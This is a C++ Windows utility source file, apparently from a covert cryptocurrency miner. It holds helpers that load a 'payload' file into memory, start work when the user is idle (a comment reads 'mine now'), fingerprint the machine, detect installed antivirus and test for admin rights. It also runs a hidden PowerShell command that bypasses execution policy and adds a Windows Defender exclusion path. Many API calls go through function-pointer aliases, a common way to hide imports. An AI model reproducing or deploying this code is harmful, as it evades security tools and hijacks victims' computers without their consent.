#include "../include/util.h"
#include "../include/process_info.h"
#include "../include/encryption.h"
#include <iostream>
#include <intrin.h>
#include <sys/types.h>
#include <signal.h>
#include <vector>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <chrono>
#include <unordered_map>
#include <algorithm>
#include <chrono>
#include <wbemidl.h>
#include <comdef.h>


typedef BOOL(WINAPI* pGetLastInputInfo_t)(PLASTINPUTINFO);
typedef HANDLE(WINAPI* pCreateMutexA_t)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot_t)(DWORD, DWORD);
typedef BOOL(WINAPI* pProcess32FirstW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* pProcess32NextW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* pCloseHandle_t)(HANDLE);
typedef BOOL(WINAPI* pGetUserNameA_util_t)(LPSTR, LPDWORD);
typedef BOOL(WINAPI* pOpenProcessToken_t)(HANDLE, DWORD, PHANDLE);
typedef BOOL(WINAPI* pGetTokenInformation_t)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
typedef LONG(WINAPI* pRegOpenKeyExA_util_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG(WINAPI* pRegCloseKey_util_t)(HKEY);
typedef LONG(WINAPI* pRegEnumKeyExA_t)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPSTR, LPDWORD, PFILETIME);
typedef LONG(WINAPI* pRegOpenKeyExW_t)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
typedef LONG(WINAPI* pRegEnumKeyExW_t)(HKEY, DWORD, LPWSTR, LPDWORD, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
typedef LONG(WINAPI* pRegQueryValueExW_t)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef BOOL(WINAPI* pCreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef DWORD(WINAPI* pWaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL(WINAPI* pGetExitCodeProcess_t)(HANDLE, LPDWORD);

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")


BYTE *buffer_payload(wchar_t *filename, OUT size_t &r_size)
{
    HANDLE file = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if(file == INVALID_HANDLE_VALUE) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "Could not open file!" << std::endl;
#endif
        return nullptr;
    }
    HANDLE mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0);
    if (!mapping) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "Could not create mapping!" << std::endl;
#endif
        CloseHandle(file);
        return nullptr;
    }
    BYTE *dllRawData = (BYTE*) MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    if (dllRawData == nullptr) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "Could not map view of file" << std::endl;
#endif
        CloseHandle(mapping);
        CloseHandle(file);
        return nullptr;
    }
    r_size = GetFileSize(file, 0);
    BYTE* localCopyAddress = (BYTE*) VirtualAlloc(NULL, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (localCopyAddress == NULL) {
        std::cerr << "Could not allocate memory in the current process" << std::endl;
        return nullptr;
    }
    memcpy(localCopyAddress, dllRawData, r_size);
    UnmapViewOfFile(dllRawData);
    CloseHandle(mapping);
    CloseHandle(file);
    return localCopyAddress;
}

void free_buffer(BYTE* buffer)
{
    if (buffer == NULL) return;
    VirtualFree(buffer, 0, MEM_RELEASE);
}

wchar_t* get_file_name(wchar_t *full_path)
{
    if (!full_path) return nullptr;
    const size_t len = wcslen(full_path);
    if (len < 2) return full_path;
    // Walk backwards. `size_t` is unsigned so `i >= 0` would spin forever;
    // use the classic `while (i-- > 0)` decrement-after-compare instead.
    size_t i = len;
    while (i-- > 0) {
        if (full_path[i] == L'\\' || full_path[i] == L'/')
            return full_path + i + 1;
    }
    return full_path;
}


std::string GetWindowsUsername() {
    pGetUserNameA_util_t _GetUserNameA = (pGetUserNameA_util_t)GetUserNameA;
    const DWORD MAX_USERNAME_LENGTH = 256;
    char username[MAX_USERNAME_LENGTH];
    DWORD size = MAX_USERNAME_LENGTH;

    if (!_GetUserNameA || !_GetUserNameA(username, &size)) {
        return "guest";
    }

    std::string result(username, size - 1);
    std::replace(result.begin(), result.end(), ' ', '-');
    return result;
}

int GetSystemUptimeMinutes() {
    #ifdef _WIN32
    ULONGLONG uptimeMs = GetTickCount64();
    #else
    // For Linux/Unix: use system uptime via /proc/uptime or clock_gettime
    auto now = std::chrono::steady_clock::now();
    auto duration = now.time_since_epoch();
    ULONGLONG uptimeMs = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
    #endif
    int uptimeMinutes = (int)(uptimeMs / (1000 * 60));
    return uptimeMinutes;
}

wchar_t* get_directory(IN wchar_t *full_path, OUT wchar_t *out_buf, IN const size_t out_buf_size)
{
    if (out_buf == nullptr || out_buf_size == 0)
        return out_buf;
    if (full_path == nullptr) {
        out_buf[0] = L'\0';
        return out_buf;
    }

    memset(out_buf, 0, out_buf_size);
    // Copy only the real string length (plus terminator), clamped to the
    // buffer, instead of trusting out_buf_size to match the source size.
    const size_t maxChars = out_buf_size / sizeof(wchar_t);
    const size_t pathChars = wcsnlen(full_path, maxChars);
    const size_t copyBytes = (pathChars + 1) * sizeof(wchar_t) < out_buf_size
                                 ? (pathChars + 1) * sizeof(wchar_t)
                                 : out_buf_size;
    memcpy(out_buf, full_path, copyBytes);

    wchar_t *name_ptr = get_file_name(out_buf);
    if (name_ptr != nullptr) {
        *name_ptr = L'\0'; //cut it
    }
    return out_buf;
}


bool IsPidRunning(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        return false;
    }

    DWORD exitCode;
    if (GetExitCodeProcess(hProcess, &exitCode)) {
        CloseHandle(hProcess);
        return (exitCode == STILL_ACTIVE);
    }

    CloseHandle(hProcess);
    return false;
}


bool AreProcessesRunning(const std::vector<std::string>& processNames) {
    pCreateToolhelp32Snapshot_t _CreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot_t)CreateToolhelp32Snapshot;
    pProcess32FirstW_t _Process32FirstW = (pProcess32FirstW_t)Process32FirstW;
    pProcess32NextW_t _Process32NextW = (pProcess32NextW_t)Process32NextW;
    pCloseHandle_t _CloseHandle = (pCloseHandle_t)CloseHandle;
    if (!_CreateToolhelp32Snapshot || !_Process32FirstW || !_Process32NextW || !_CloseHandle)
        return false;

    HANDLE hProcessSnap = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
        return false;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!_Process32FirstW(hProcessSnap, &pe32)) {
        _CloseHandle(hProcessSnap);
        return false;
    }

    do {
        // Convert the wide process name to UTF-8 (WideCharToMultiByte is
        // behavior-neutral with the removed std::wstring_convert path).
        const int wlen = lstrlenW(pe32.szExeFile);
        int needed = WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, wlen, NULL, 0, NULL, NULL);
        std::string currentProcess(needed > 0 ? (size_t)needed : 0, '\0');
        if (needed > 0)
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, wlen, &currentProcess[0], needed, NULL, NULL);
        std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), ::tolower);

        for (const auto& targetProcess : processNames) {
            std::string targetLower = targetProcess;
            std::transform(targetLower.begin(), targetLower.end(), targetLower.begin(), ::tolower);
            if (currentProcess.find(targetLower) != std::string::npos) {
                _CloseHandle(hProcessSnap);
                return true;
            }
        }
    } while (_Process32NextW(hProcessSnap, &pe32));

    _CloseHandle(hProcessSnap);
    return false;
}


// Convert std::string to LPWSTR
LPWSTR StringToLPWSTR(const std::string& str) {
    if (str.empty()) {
        wchar_t* empty = new wchar_t[1];
        empty[0] = L'\0';
        return empty;
    }
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), NULL, 0);
    wchar_t* wstr = new wchar_t[size_needed + 1];
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), wstr, size_needed);
    wstr[size_needed] = 0;
    return wstr;
}

std::string buildCommandFromTemplate(
    const std::string& template_str,
    const std::unordered_map<std::string, std::string>& replacements
) {
    std::string result = template_str;
    
    for (const auto& [placeholder, value] : replacements) {
        size_t pos = result.find(placeholder);
        if (pos != std::string::npos) {
            result.replace(pos, placeholder.length(), value);
        }
    }
    
    return result;
}

bool IsDeviceIdle(int minutes) {
    // A negative threshold would make the machine appear always idle (a busy
    // check slamming it into "mine now"). Treat it as "idle immediately".
    if (minutes < 0) minutes = 0;

    pGetLastInputInfo_t _GetLastInputInfo = (pGetLastInputInfo_t)GetLastInputInfo;
    pCloseHandle_t _GetTickCount = (pCloseHandle_t)GetTickCount;
    typedef DWORD(WINAPI* pGetTickCount_t)();
    pGetTickCount_t _Tick = (pGetTickCount_t)GetTickCount;

    LASTINPUTINFO lastInputInfo;
    lastInputInfo.cbSize = sizeof(LASTINPUTINFO);

    if (!_GetLastInputInfo || !_GetLastInputInfo(&lastInputInfo))
        return false;

    DWORD currentTickCount = _Tick ? _Tick() : GetTickCount();
    DWORD idleTimeMs = currentTickCount - lastInputInfo.dwTime;
    auto thresholdMs = std::chrono::minutes(minutes).count() * 60 * 1000;
    bool isIdle = (idleTimeMs >= thresholdMs);

    return isIdle;
}



bool IsAnotherInstanceRunning(const char* mutexName) {
    pCreateMutexA_t _CreateMutexA = (pCreateMutexA_t)CreateMutexA;
    pCloseHandle_t _CloseHandle = (pCloseHandle_t)CloseHandle;
    if (!_CreateMutexA) return true;

    HANDLE hMutex = _CreateMutexA(NULL, TRUE, mutexName);
    if (hMutex == NULL) return true;

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (_CloseHandle) _CloseHandle(hMutex);
        return true;
    }
    return false;
}

std::string GetCPUName() {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 
        0, KEY_READ, &hKey);
    
    if (result != ERROR_SUCCESS) {
        return "Unknown";
    }

    char cpuName[256] = {0};
    DWORD size = sizeof(cpuName);
    result = RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpuName, &size);
    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        return std::string(cpuName);
    }
    return "Unknown";
}

std::string GetGPUName() {
    // Try WMI first for better detection
    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        // Fall back to registry if WMI initialization fails
        goto registry_fallback;
    }

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
                               RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) {
        CoUninitialize();
        goto registry_fallback;
    }

    {
        IWbemLocator *pLoc = NULL;
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                               IID_IWbemLocator, (LPVOID *)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            goto registry_fallback;
        }

        IWbemServices *pSvc = NULL;
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) {
            pLoc->Release();
            CoUninitialize();
            goto registry_fallback;
        }

        hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                                RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            goto registry_fallback;
        }

        IEnumWbemClassObject *pEnumerator = NULL;
        hres = pSvc->ExecQuery(_bstr_t(L"WQL"), _bstr_t(L"SELECT Name FROM Win32_VideoController"),
                              WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            goto registry_fallback;
        }

        IWbemClassObject *pclsObj = NULL;
        ULONG uReturn = 0;
        std::string gpuName = "Unknown";
        
        while (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) == S_OK && uReturn > 0) {
            VARIANT vtProp;
            VariantInit(&vtProp);
            
            HRESULT hresGet = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hresGet) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
                // Successfully got the Name property
                size_t len = wcslen(vtProp.bstrVal) + 1;
                char* gpuNameA = new char[len];
                
                if (wcstombs_s(nullptr, gpuNameA, len, vtProp.bstrVal, _TRUNCATE) == 0) {
                    gpuName = std::string(gpuNameA);
                    
                    // Trim whitespace
                    size_t start = gpuName.find_first_not_of(" \t\r\n");
                    if (start != std::string::npos) {
                        gpuName = gpuName.substr(start);
                    }
                    size_t end = gpuName.find_last_not_of(" \t\r\n");
                    if (end != std::string::npos) {
                        gpuName = gpuName.substr(0, end + 1);
                    }
                    
                    // If we got a valid name, break and return it
                    if (!gpuName.empty() && gpuName != "Unknown") {
                        delete[] gpuNameA;
                        VariantClear(&vtProp);
                        pclsObj->Release();
                        break;
                    }
                }
                delete[] gpuNameA;
            }
            
            VariantClear(&vtProp);
            pclsObj->Release();
        }
        
        if (gpuName != "Unknown") {
            pEnumerator->Release();
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return gpuName;
        }

        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
    }

registry_fallback:
    {
    pRegOpenKeyExW_t _RegOpenKeyExW = (pRegOpenKeyExW_t)RegOpenKeyExW;
    pRegEnumKeyExW_t _RegEnumKeyExW = (pRegEnumKeyExW_t)RegEnumKeyExW;
    pRegQueryValueExW_t _RegQueryValueExW = (pRegQueryValueExW_t)RegQueryValueExW;
    pRegCloseKey_util_t _RegCloseKey = (pRegCloseKey_util_t)RegCloseKey;
    if (!_RegOpenKeyExW || !_RegEnumKeyExW || !_RegQueryValueExW || !_RegCloseKey)
        return "Unknown";

    HKEY hKey = NULL;
    LONG result = _RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}",
        0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hKey);

    if (result != ERROR_SUCCESS)
        return "Unknown";

    std::string gpuName = "Unknown";
    DWORD index = 0;
    wchar_t subkeyName[256] = {0};
    DWORD subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);

    while (_RegEnumKeyExW(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        HKEY hSubKey = NULL;
        if (_RegOpenKeyExW(hKey, subkeyName, 0, KEY_QUERY_VALUE, &hSubKey) == ERROR_SUCCESS) {
            wchar_t providerName[512] = {0};
            DWORD size = sizeof(providerName);
            if (_RegQueryValueExW(hSubKey, L"ProviderName", NULL, NULL, (LPBYTE)providerName, &size) == ERROR_SUCCESS) {
                if (wcsstr(providerName, L"NVIDIA") != NULL ||
                    wcsstr(providerName, L"AMD") != NULL ||
                    wcsstr(providerName, L"ATI") != NULL ||
                    wcsstr(providerName, L"Advanced Micro Devices") != NULL ||
                    wcsstr(providerName, L"Intel") != NULL) {
                    wchar_t deviceDesc[512] = {0};
                    DWORD descSize = sizeof(deviceDesc);
                    if (_RegQueryValueExW(hSubKey, L"DeviceDesc", NULL, NULL, (LPBYTE)deviceDesc, &descSize) == ERROR_SUCCESS) {
                        wchar_t* deviceName = deviceDesc;
                        wchar_t* semicolon = wcschr(deviceDesc, L';');
                        if (semicolon != NULL) deviceName = semicolon + 1;
                        char gpuNameA[512];
                        wcstombs_s(nullptr, gpuNameA, sizeof(gpuNameA), deviceName, _TRUNCATE);
                        gpuName = std::string(gpuNameA);
                        size_t start = gpuName.find_first_not_of(" \t");
                        if (start != std::string::npos) gpuName = gpuName.substr(start);
                        size_t end = gpuName.find_last_not_of(" \t");
                        if (end != std::string::npos) gpuName = gpuName.substr(0, end + 1);
                        _RegCloseKey(hSubKey);
                        _RegCloseKey(hKey);
                        return gpuName;
                    }
                }
            }
            _RegCloseKey(hSubKey);
        }
        index++;
        subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);
    }
    _RegCloseKey(hKey);
    return gpuName;
    }
}

std::string GetComputerHash() {
    // 1. Collect CPUID leaf 1: processor signature + feature flags
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);

    // Mask out EBX bits 31-24 (Initial APIC ID) — varies by which core runs CPUID
    char cpuidStr[36];
    snprintf(cpuidStr, sizeof(cpuidStr), "%08X%08X%08X%08X",
        (unsigned int)cpuInfo[0], (unsigned int)(cpuInfo[1] & 0x00FFFFFF),
        (unsigned int)cpuInfo[2], (unsigned int)cpuInfo[3]);

    // 2. Collect motherboard serial number via WMI (Win32_BaseBoard.SerialNumber)
    std::string mbSerial = "0";

    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    // S_OK / S_FALSE: we own a ref; RPC_E_CHANGED_MODE: COM already init'd on thread
    bool ownedCOMInit = (hres == S_OK || hres == S_FALSE);

    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);
    if (SUCCEEDED(hres)) {
        IWbemServices* pSvc = NULL;
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (SUCCEEDED(hres)) {
            CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

            IEnumWbemClassObject* pEnum = NULL;
            hres = pSvc->ExecQuery(_bstr_t(L"WQL"),
                _bstr_t(L"SELECT SerialNumber FROM Win32_BaseBoard"),
                WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnum);
            if (SUCCEEDED(hres)) {
                IWbemClassObject* pObj = NULL;
                ULONG uReturn = 0;
                if (pEnum->Next(WBEM_INFINITE, 1, &pObj, &uReturn) == S_OK && uReturn > 0) {
                    VARIANT vtProp;
                    VariantInit(&vtProp);
                    if (SUCCEEDED(pObj->Get(L"SerialNumber", 0, &vtProp, 0, 0)) &&
                        vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
                        int len = WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1,
                            NULL, 0, NULL, NULL);
                        if (len > 1) {
                            std::string s(len - 1, '\0');
                            WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1,
                                &s[0], len, NULL, NULL);
                            mbSerial = s;
                        }
                    }
                    VariantClear(&vtProp);
                    pObj->Release();
                }
                pEnum->Release();
            }
            pSvc->Release();
        }
        pLoc->Release();
    }
    if (ownedCOMInit) CoUninitialize();

    // 3. Combine CPUID string + motherboard serial, then FNV-1a 64-bit hash
    std::string combined = std::string(cpuidStr) + "|" + mbSerial;

    unsigned long long hash = 14695981039346656037ULL;
    for (unsigned char c : combined) {
        hash ^= (unsigned long long)c;
        hash *= 1099511628211ULL;
    }

    char result[17];
    snprintf(result, sizeof(result), "%016llX", hash);
    return std::string(result);
}

std::string GetAntivirusName() {
    pRegOpenKeyExA_util_t _RegOpenKeyExA = (pRegOpenKeyExA_util_t)RegOpenKeyExA;
    pRegCloseKey_util_t _RegCloseKey = (pRegCloseKey_util_t)RegCloseKey;
    pRegEnumKeyExA_t _RegEnumKeyExA = (pRegEnumKeyExA_t)RegEnumKeyExA;
    if (!_RegOpenKeyExA || !_RegCloseKey || !_RegEnumKeyExA)
        return "Unknown";

    HKEY hKey;
    LONG result = _RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender",
        0, KEY_READ, &hKey);

    if (result == ERROR_SUCCESS) {
        _RegCloseKey(hKey);
        return "Windows Defender";
    }

    result = _RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        0, KEY_READ, &hKey);

    if (result == ERROR_SUCCESS) {
        const char* antivirusNames[] = {
            "Norton", "McAfee", "Kaspersky", "AVG", "Avast",
            "Bitdefender", "F-Secure", "ESET", "Trend Micro", "Symantec"
        };

        DWORD index = 0;
        char subkeyName[256];
        DWORD subkeyNameSize = sizeof(subkeyName);

        while (_RegEnumKeyExA(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            for (const char* av : antivirusNames) {
                if (strstr(subkeyName, av) != nullptr) {
                    _RegCloseKey(hKey);
                    return std::string(av);
                }
            }
            index++;
            subkeyNameSize = sizeof(subkeyName);
        }
        _RegCloseKey(hKey);
    }

    return "Unknown";
}

bool IsRunningAsAdmin() {
    pOpenProcessToken_t _OpenProcessToken = (pOpenProcessToken_t)OpenProcessToken;
    pGetTokenInformation_t _GetTokenInformation = (pGetTokenInformation_t)GetTokenInformation;
    pCloseHandle_t _CloseHandle = (pCloseHandle_t)CloseHandle;
    if (!_OpenProcessToken || !_GetTokenInformation) return false;

    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize = sizeof(TOKEN_ELEVATION);

    if (!_OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return false;

    if (!_GetTokenInformation(hToken, TokenElevation, &elevation, dwSize, &dwSize)) {
        if (_CloseHandle) _CloseHandle(hToken);
        return false;
    }

    isAdmin = elevation.TokenIsElevated;
    if (_CloseHandle) _CloseHandle(hToken);
    return isAdmin == TRUE;
}

// Add a path to Windows Defender exclusion using PowerShell
bool AddDefenderExclusion(const std::string& path) {
    // Only attempt if running as admin
    if (!IsRunningAsAdmin()) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] Not running as admin, cannot add Defender exclusion" << std::endl;
#endif
        return false;
    }

    pCreateProcessW_t _CreateProcessW = (pCreateProcessW_t)CreateProcessW;
    pWaitForSingleObject_t _WaitForSingleObject = (pWaitForSingleObject_t)WaitForSingleObject;
    pGetExitCodeProcess_t _GetExitCodeProcess = (pGetExitCodeProcess_t)GetExitCodeProcess;
    pCloseHandle_t _CloseHandle = (pCloseHandle_t)CloseHandle;
    if (!_CreateProcessW) return false;

    // Build PowerShell command to add exclusion
    std::string psCmd = "powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; Add-MpPreference -ExclusionPath '";
    psCmd += path + "' -Force -ErrorAction SilentlyContinue\"";

#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] Attempting to add Defender exclusion for: " << path << std::endl;
#endif

    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &psCmd[0], (int)psCmd.size(), NULL, 0);
    std::wstring wpsCommand(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &psCmd[0], (int)psCmd.size(), &wpsCommand[0], size_needed);

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };

    BOOL result = _CreateProcessW(NULL, (LPWSTR)wpsCommand.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (!result) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] Failed to create PowerShell process" << std::endl;
#endif
        return false;
    }

    if (_WaitForSingleObject) _WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD exitCode = 0;
    if (_GetExitCodeProcess) _GetExitCodeProcess(pi.hProcess, &exitCode);

    if (_CloseHandle) { _CloseHandle(pi.hProcess); _CloseHandle(pi.hThread); }

    if (exitCode != 0) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] PowerShell command failed with exit code: " << exitCode << std::endl;
#endif
        return false;
    }

#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[+] Successfully added Defender exclusion for: " << path << std::endl;
#endif
    return true;
}
